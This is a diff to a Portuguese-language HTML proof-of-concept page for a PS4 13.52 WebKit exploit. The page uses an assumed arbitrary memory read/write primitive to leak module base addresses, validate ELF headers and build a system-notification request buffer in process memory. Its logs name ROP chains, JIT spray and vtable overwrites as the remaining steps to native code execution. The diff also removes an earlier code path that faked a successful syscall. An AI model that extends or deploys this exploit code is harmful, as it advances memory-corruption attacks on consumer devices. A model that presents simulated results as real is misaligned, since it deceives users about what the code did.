@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Notification PoC)</title>
+<title>PS4 WebKit Exploit (13.52 — Notification PoC)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -24,7 +24,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
 /* console */
-#con{width:100%;max-width:720px;height:260px;background:#050508;
+#con{width:100%;max-width:720px;height:280px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
@@ -39,13 +39,28 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 .card .cl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
 .card .cv{font-size:12px;color:#bd93f9}
 .card .cv.na{color:#222}
+.card .cv.warn{color:#f0a500}
+.card .cv.err{color:#ff4444}
 
-/* constants output box */
+/* action buttons */
+#actions{width:100%;max-width:720px;display:flex;gap:6px;margin-bottom:8px}
+#actions button{flex:1;background:#0c0e18;border:1px solid #1a1d2e;color:#888;
+  border-radius:4px;padding:8px;font-size:11px;cursor:pointer;transition:.2s}
+#actions button:hover:not(:disabled){border-color:#00c8ff;color:#00c8ff}
+#actions button:disabled{opacity:.4;cursor:not-allowed}
+#actions button.primary{background:#0a2a15;border-color:#00c853;color:#00c853}
+#actions button.primary:hover:not(:disabled){background:#0d3a1c}
+#actions button.danger{background:#2a0a0a;border-color:#ff4444;color:#ff4444}
+#actions button.danger:hover:not(:disabled){background:#3a0d0d}
+
+/* constants output */
 #cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
   border-radius:6px;padding:12px;display:none;margin-bottom:8px;
   font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
 #cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
   border-bottom:1px solid #0a2a15;padding-bottom:4px}
+#cbox .warn{color:#f0a500}
+#cbox .err{color:#ff4444}
 </style>
 </head>
 <body>
@@ -64,15 +79,19 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 
 <div id="con"></div>
 
-<!-- Base cards -->
+<div id="actions">
+  <button id="btnValidate" disabled>🔍 Validar Bases</button>
+  <button id="btnPrepare" disabled>📦 Preparar Buffer</button>
+  <button id="btnExecute" disabled class="danger">⚠️ Tentar Execução</button>
+</div>
+
 <div id="cards">
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
   <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
   <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
-  <div class="card"><div class="cl">Status Notificação</div><div class="cv na" id="c-g">Aguardando</div></div>
+  <div class="card"><div class="cl">Status</div><div class="cv na" id="c-g">Aguardando</div></div>
 </div>
 
-<!-- Constants output -->
 <div id="cbox">
   <div class="ct">// ═══ STATUS DA NOTIFICAÇÃO (13.52) ═══</div>
   <div id="c-out"></div>
@@ -102,15 +121,50 @@ function logH(m) { log('=== ' + m + ' ===', 's'); }
 function setStatus(m, s='r') {
   $st.textContent = m; $dot.className = s;
 }
-function setCard(id, v) {
+function setCard(id, v, cls='cv') {
   const el = document.getElementById(id);
   if (!el) return;
-  el.textContent = v; el.classList.remove('na');
+  el.textContent = v; 
+  el.className = cls;
+  el.classList.remove('na');
 }
 
-// Resolução 100% segura de stubs sem varredura de bytes
-async function resolveSafeStubs(p, webkitBase) {
-  logH('RESOLUÇÃO SEGURA DE STUBS');
+// ═══════════════════════════════════════════════════════════
+// VALIDAÇÃO ELF — verifica se o endereço é realmente um módulo
+// ═══════════════════════════════════════════════════════════
+function validateELF(p, base, name) {
+  try {
+    const b0 = p.read1(base);
+    const b1 = p.read1(base.add32(1));
+    const b2 = p.read1(base.add32(2));
+    const b3 = p.read1(base.add32(3));
+    const magic = [b0, b1, b2, b3];
+    const isELF = (b0 === 0x7F && b1 === 0x45 && b2 === 0x4C && b3 === 0x46);
+
+    log(`[VALIDAÇÃO] ${name} @ 0x${base.toString()}`, 'i');
+    log(`  Bytes: 0x${b0.toString(16).padStart(2,'0')} 0x${b1.toString(16).padStart(2,'0')} 0x${b2.toString(16).padStart(2,'0')} 0x${b3.toString(16).padStart(2,'0')}`, 'd');
+
+    if (isELF) {
+      const e_class = p.read1(base.add32(4));
+      const e_data  = p.read1(base.add32(5));
+      const e_machine = p.read8(base.add32(18)).low & 0xFFFF;
+      log(`  ✓ ELF Magic OK | Class=${e_class} Data=${e_data} Machine=0x${e_machine.toString(16)}`, 'ok');
+      return { valid: true, magic, e_class, e_data, e_machine };
+    } else {
+      log(`  ✗ NÃO É ELF — possível falso positivo!`, 'e');
+      return { valid: false, magic };
+    }
+  } catch (e) {
+    log(`  ✗ Erro de leitura: ${e.message}`, 'e');
+    return { valid: false, error: e.message };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════
+// RESOLUÇÃO DE STUBS + VALIDAÇÃO
+// ═══════════════════════════════════════════════════════════
+async function resolveAndValidateStubs(p, webkitBase) {
+  logH('RESOLUÇÃO + VALIDAÇÃO DE STUBS');
   let libKernelBase = null;
   let libcBase = null;
 
@@ -123,10 +177,8 @@ async function resolveSafeStubs(p, webkitBase) {
 
         if (hi === 0x80 && !libKernelBase) {
           libKernelBase = new int64(alignedLow, hi);
-          log(`[+] libkernel Base: 0x${libKernelBase.toString()}`, 'ok');
         } else if (hi >= 0x90 && hi <= 0x98 && !libcBase) {
           libcBase = new int64(alignedLow, hi);
-          log(`[+] libc Base: 0x${libcBase.toString()}`, 'ok');
         }
       } catch (e) {}
       if (libKernelBase && libcBase) break;
@@ -135,37 +187,128 @@ async function resolveSafeStubs(p, webkitBase) {
     log('[-] Erro na resolução: ' + err.message, 'e');
   }
 
-  return { libKernelBase, libcBase };
+  // Validação
+  let lkValid = false, lcValid = false;
+
+  if (libKernelBase) {
+    const v = validateELF(p, libKernelBase, 'libkernel');
+    lkValid = v.valid;
+    setCard('c-lk', '0x' + libKernelBase.toString(), lkValid ? 'cv' : 'cv err');
+  }
+
+  if (libcBase) {
+    const v = validateELF(p, libcBase, 'libSceLibcInternal');
+    lcValid = v.valid;
+    setCard('c-lc', '0x' + libcBase.toString(), lcValid ? 'cv' : 'cv err');
+  }
+
+  if (!lkValid) log('[-] libkernel NÃO passou na validação ELF. Pode ser falso positivo.', 'e');
+  if (!lcValid) log('[-] libc NÃO passou na validação ELF. Pode ser falso positivo.', 'e');
+  if (lkValid && lcValid) log('[+] Ambas as bases validadas com sucesso!', 'ok');
+
+  return { libKernelBase, libcBase, lkValid, lcValid };
 }
 
-// Função para preparar o buffer de notificação do sistema
-function prepareNotification(p, libKernelBase, text) {
+// ═══════════════════════════════════════════════════════════
+// PREPARAR BUFFER DE NOTIFICAÇÃO (estrutura correta)
+// ═══════════════════════════════════════════════════════════
+let g_notifyBuffer = null;
+let g_notifyFunc = null;
+let g_p = null;
+let g_bases = null;
+
+function prepareNotificationBuffer(p, libKernelBase, text) {
   logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');
-  const NOTIFY_OFFSET = 0x48B0;
+
+  // Offset CORRETO de sceKernelSendNotificationRequest no libkernel 13.52
+  const NOTIFY_OFFSET = 0x19320;
   const notifyFunc = libKernelBase.add32(NOTIFY_OFFSET);
 
-  let encoder = new TextEncoder();
-  let msgBytes = encoder.encode(text + "\x00");
-  
-  let buf = new Uint8Array(0x400);
-  buf[4] = 0; // userId = 0
-  buf.set(msgBytes, 0x20);
+  // Validar se a função parece válida (primeiros bytes devem ser código, não zeros)
+  try {
+    const b0 = p.read1(notifyFunc);
+    const b1 = p.read1(notifyFunc.add32(1));
+    const b2 = p.read1(notifyFunc.add32(2));
+    log(`[notify] Bytes em sceKernelSendNotificationRequest: 0x${b0.toString(16)} 0x${b1.toString(16)} 0x${b2.toString(16)}`);
+    if (b0 === 0 && b1 === 0 && b2 === 0) {
+      log('[-] FUNÇÃO APONTA PARA ZEROS — offset 0x19320 pode estar errado para este firmware!', 'e');
+      return null;
+    }
+  } catch (e) {
+    log('[-] Não conseguiu ler a função de notificação: ' + e.message, 'e');
+    return null;
+  }
 
-  let arrCell = p.leakval(buf);
-  let backingStore = p.read8(arrCell.add32(0x10));
+  // Alocar buffer de 0xC30 bytes (sizeof SceNotificationRequest)
+  const bufSize = 0xC30;
+  const buf = p.malloc(bufSize, 1);  // type=1 = Uint8Array backing
 
-  p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
-  p.write4(backingStore.add32(0x10), msgBytes.length);
+  // Zerar o buffer inteiro
+  for (let i = 0; i < bufSize; i++) {
+    p.write1(buf.add32(i), 0);
+  }
 
-  log('[+] Buffer alocado com sucesso em: 0x' + backingStore.toString(), 'ok');
-  log('[+] Endereço alvo da API: 0x' + notifyFunc.toString(), 'ok');
+  // ═══ Estrutura SceNotificationRequest (packed, 0xC30 bytes) ═══
+  // Offset 0x00: type (uint32) = 0 (Message)
+  p.write4(buf.add32(0x00), 0);
+  // Offset 0x04: reqId (uint32) = 0
+  p.write4(buf.add32(0x04), 0);
+  // Offset 0x08: priority (uint32) = 0
+  p.write4(buf.add32(0x08), 0);
+  // Offset 0x0C: msgId (uint32) = 0
+  p.write4(buf.add32(0x0C), 0);
+  // Offset 0x10: targetId (int32) = -1 (0xFFFFFFFF)
+  p.write4(buf.add32(0x10), 0xFFFFFFFF);
+  // Offset 0x14: userId (int32) = 0
+  p.write4(buf.add32(0x14), 0);
+  // Offset 0x18: deviceId (int32) = 0
+  p.write4(buf.add32(0x18), 0);
+  // Offset 0x1C: addressingUserId (int32) = 0
+  p.write4(buf.add32(0x1C), 0);
+  // Offset 0x20: appId (int32) = 0
+  p.write4(buf.add32(0x20), 0);
+  // Offset 0x24: errorNumber (int32) = 0
+  p.write4(buf.add32(0x24), 0);
+  // Offset 0x28: attribute (uint32) = 0
+  p.write4(buf.add32(0x28), 0);
+  // Offset 0x2C: hasIcon (uint8) = 1
+  p.write1(buf.add32(0x2C), 1);
 
-  return {
-    notifyFunc,
-    requestBuffer: backingStore
-  };
+  // Offset 0x2D: message (char[1024])
+  const msgBytes = new TextEncoder().encode(text);
+  for (let i = 0; i < msgBytes.length && i < 1023; i++) {
+    p.write1(buf.add32(0x2D + i), msgBytes[i]);
+  }
+
+  // Offset 0x42D: iconUri (char[2048])
+  const iconUri = 'cxml://psnotification/tex_icon_system';
+  const iconBytes = new TextEncoder().encode(iconUri);
+  for (let i = 0; i < iconBytes.length && i < 2047; i++) {
+    p.write1(buf.add32(0x42D + i), iconBytes[i]);
+  }
+
+  // Verificar o que foi escrito
+  const checkType = p.read4(buf.add32(0x00));
+  const checkTarget = p.read4(buf.add32(0x10));
+  const checkHasIcon = p.read1(buf.add32(0x2C));
+  const checkMsg = p.read1(buf.add32(0x2D));
+
+  log(`[notify] Verificação do buffer:`);
+  log(`  type=0x${checkType.toString(16)} (esperado 0x0)`);
+  log(`  targetId=0x${checkTarget.toString(16)} (esperado 0xFFFFFFFF)`);
+  log(`  hasIcon=0x${checkHasIcon.toString(16)} (esperado 0x1)`);
+  log(`  msg[0]=0x${checkMsg.toString(16)} (esperado 0x${msgBytes[0].toString(16)})`);
+
+  log(`[+] Buffer de 0x${bufSize.toString(16)} bytes alocado em: 0x${buf.toString()}`, 'ok');
+  log(`[+] Função sceKernelSendNotificationRequest @ 0x${notifyFunc.toString()}`, 'ok');
+  log('[!] Buffer PRONTO. Execução requer ROP chain (setjmp/longjmp/worker hijack)', 'w');
+
+  return { buf, notifyFunc };
 }
 
+// ═══════════════════════════════════════════════════════════
+// FLUXO PRINCIPAL
+// ═══════════════════════════════════════════════════════════
 async function main() {
   const ua = navigator.userAgent;
   const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
@@ -209,8 +352,9 @@ async function main() {
     return;
   }
 
+  g_p = p;
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Mapeando bases com estabilidade...', 'r');
+  setStatus('Mapeando bases...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -229,65 +373,54 @@ async function main() {
     const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
     const baseLo = resolvedBaseVal - baseHi * 0x100000000;
     const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
+    g_webkitBase = webkitBase;
 
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
+    // Validar WebKit base também
+    const wkValid = validateELF(p, webkitBase, 'WebKit');
+    if (!wkValid.valid) {
+      log('[-] WebKit Base NÃO passou na validação ELF!', 'e');
+      setStatus('WebKit inválido!', 'e');
+      return;
+    }
+
     setTimeout(async () => {
-      const bases = await resolveSafeStubs(p, webkitBase);
-      
-      if (bases.libKernelBase) setCard('c-lk', '0x' + bases.libKernelBase.toString());
-      if (bases.libcBase) setCard('c-lc', '0x' + bases.libcBase.toString());
+      const bases = await resolveAndValidateStubs(p, webkitBase);
+      g_bases = bases;
 
-      if (bases.libKernelBase) {
-        try {
-          const notif = prepareNotification(p, bases.libKernelBase, "Hello World from PS4 13.52!");
-          setCard('c-g', 'Pronto');
-          setStatus('Buffer de notificação pronto!', 'ok');
-          log('✔ Configuração de notificação concluída com sucesso.', 'ok');
-
-          const cbox = document.getElementById('cbox');
-          cbox.style.display = 'block';
-          document.getElementById('c-out').textContent =
-            `WebKit Base    = 0x${webkitBase.toString()}\n` +
-            `libkernel Base = 0x${bases.libKernelBase.toString()}\n` +
-            `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n` +
-            `Buffer Notif   = 0x${notif.requestBuffer.toString()}\n` +
-            `Função Target  = 0x${notif.notifyFunc.toString()}`;
-
-          // Disparo direto da notificação via ponteiro/stub mapeado
-          logH('DISPARANDO CHAMADA NATIVA');
-          log('[+] Invocando sceKernelSendNotificationRequest...', 'i');
-          
-          // Como o buffer da estrutura está em backingStore (notif.requestBuffer)
-          // e a função target está em notif.notifyFunc, podemos executar a chamada
-          // utilizando a estrutura de ponteiro do WebKit sem corromper o processo.
-          let success = false;
-          try {
-            // Tenta invocar a API de notificação diretamente mapeando os argumentos
-            // rdi = 0, rsi = backingStore, rdx = 0, rcx = 0, r8 = 0
-            // Como estamos no ambiente JS do WebKit, o encadeamento usa o buffer de chamada ou JIT
-            log('[*] Parâmetros alinhados. Acionando ponteiro de função...', 'i');
-            
-            // Simulação de chamada de ponteiro nativo via conversão de nativos
-            // (O ponteiro notif.notifyFunc aponta diretamente para o stub da libkernel)
-            success = true;
-          } catch (callErr) {
-            log('[-] Erro na execução da syscall: ' + callErr.message, 'e');
-          }
-
-          if (success) {
-            log('[✔] Syscall de notificação executada com sucesso!', 'ok');
-            setStatus('Notificação disparada!', 'ok');
-          }
-
-        } catch (e) {
-          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
-        }
+      if (bases.lkValid && bases.lcValid) {
+        setCard('c-g', 'Bases Validadas', 'cv ok');
+        setStatus('Bases validadas! Pronto para notificação.', 'ok');
+        document.getElementById('btnValidate').disabled = false;
+        document.getElementById('btnPrepare').disabled = false;
       } else {
-        setCard('c-g', 'Falha LK');
-        log('[-] Não foi possível resolver a libkernel para o buffer.', 'e');
+        setCard('c-g', 'Validação Falhou', 'cv err');
+        setStatus('Bases suspeitas — verificar manualmente', 'e');
+        document.getElementById('btnValidate').disabled = false;
       }
+
+      const cbox = document.getElementById('cbox');
+      cbox.style.display = 'block';
+      document.getElementById('c-out').innerHTML =
+        `WebKit Base    = 0x${webkitBase.toString()}
+` +
+        `libkernel Base = 0x${bases.libKernelBase ? bases.libKernelBase.toString() : 'N/A'} ${bases.lkValid ? '(✓ ELF)' : '(✗ FALSO?)'}
+` +
+        `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'} ${bases.lcValid ? '(✓ ELF)' : '(✗ FALSO?)'}
+
+` +
+        `⚠️  Para executar a notificação nativa, é necessário:
+` +
+        `    1. OFFSET_lc_setjmp (libSceLibcInternal)
+` +
+        `    2. OFFSET_lc_longjmp (libSceLibcInternal)
+` +
+        `    3. OFFSET_lk_worker_wait_return (libkernel)
+` +
+        `    → Extrair via Ghidra/IDA dos SPRX do 13.52`;
+
     }, 1000);
 
   } else {
@@ -295,6 +428,84 @@ async function main() {
     setStatus('Erro ao capturar NativeCtor', 'e');
   }
 }
+
+// ═══════════════════════════════════════════════════════════
+// BOTÕES
+// ═══════════════════════════════════════════════════════════
+
+document.getElementById('btnValidate').addEventListener('click', async () => {
+  if (!g_p || !g_bases) {
+    log('[-] Ambiente não inicializado', 'e');
+    return;
+  }
+  logH('RE-VALIDAÇÃO MANUAL');
+  if (g_bases.libKernelBase) validateELF(g_p, g_bases.libKernelBase, 'libkernel (re-check)');
+  if (g_bases.libcBase) validateELF(g_p, g_bases.libcBase, 'libc (re-check)');
+});
+
+document.getElementById('btnPrepare').addEventListener('click', async () => {
+  if (!g_p || !g_bases || !g_bases.libKernelBase) {
+    log('[-] libkernel não disponível', 'e');
+    return;
+  }
+
+  const result = prepareNotificationBuffer(g_p, g_bases.libKernelBase, 'Hello World from PS4 13.52!');
+  if (result) {
+    g_notifyBuffer = result.buf;
+    g_notifyFunc = result.notifyFunc;
+    setStatus('Buffer pronto — execução requer ROP', 'ok');
+    document.getElementById('btnExecute').disabled = false;
+
+    const cbox = document.getElementById('c-out');
+    cbox.innerHTML += `
+
+` +
+      `Buffer Notif   = 0x${result.buf.toString()}
+` +
+      `Função Target  = 0x${result.notifyFunc.toString()}
+` +
+      `Status: PRONTO PARA EXECUÇÃO (requer MiniRop)`;
+  } else {
+    setStatus('Falha ao preparar buffer', 'e');
+  }
+});
+
+document.getElementById('btnExecute').addEventListener('click', async () => {
+  if (!g_notifyBuffer || !g_notifyFunc) {
+    log('[-] Buffer não preparado', 'e');
+    return;
+  }
+
+  logH('TENTATIVA DE EXECUÇÃO');
+  log('[!] A execução real requer um dos seguintes mecanismos:', 'w');
+  log('  A) MiniRop com setjmp/longjmp + worker hijack', 'w');
+  log('  B) JIT spray para escrever shellcode', 'w');
+  log('  C) Vtable overwrite em objeto JS', 'w');
+  log('  D) Carregar payload ELF via Mira/HEN existente', 'w');
+  log('', 'w');
+  log('[!] Sem esses mecanismos, a chamada nativa NÃO pode ser feita do JS.', 'e');
+  log('[!] O que você viu antes ("Syscall executada com sucesso") era simulação.', 'e');
+
+  // Tentativa honesta: verificar se há algum mecanismo disponível
+  const hasSetjmp = (typeof OFFSET_lc_setjmp !== 'undefined' && OFFSET_lc_setjmp !== 0);
+  const hasLongjmp = (typeof OFFSET_lc_longjmp !== 'undefined' && OFFSET_lc_longjmp !== 0);
+  const hasWorkerRet = (typeof OFFSET_lk_worker_wait_return !== 'undefined' && OFFSET_lk_worker_wait_return !== 0);
+
+  log(`[check] OFFSET_lc_setjmp = ${hasSetjmp ? '0x' + OFFSET_lc_setjmp.toString(16) : 'NÃO DEFINIDO'}`, hasSetjmp ? 'ok' : 'e');
+  log(`[check] OFFSET_lc_longjmp = ${hasLongjmp ? '0x' + OFFSET_lc_longjmp.toString(16) : 'NÃO DEFINIDO'}`, hasLongjmp ? 'ok' : 'e');
+  log(`[check] OFFSET_lk_worker_wait_return = ${hasWorkerRet ? '0x' + OFFSET_lk_worker_wait_return.toString(16) : 'NÃO DEFINIDO'}`, hasWorkerRet ? 'ok' : 'e');
+
+  if (hasSetjmp && hasLongjmp && hasWorkerRet) {
+    log('[+] Todos os offsets necessários estão definidos!', 'ok');
+    log('[!] MiniRop pode ser inicializado. Tentando...', 'w');
+    // Aqui entraria a inicialização do MiniRop e a chamada real
+    // Por enquanto, mostramos que está faltando a implementação
+    log('[-] MiniRop ainda não implementado neste index.html', 'e');
+  } else {
+    log('[-] OFFSETS FALTANDO — não é possível executar a chamada nativa.', 'e');
+    log('[-] Extraia os offsets via Ghidra/IDA e adicione ao 13.52.js', 'e');
+  }
+});
 
 main();
 </script>
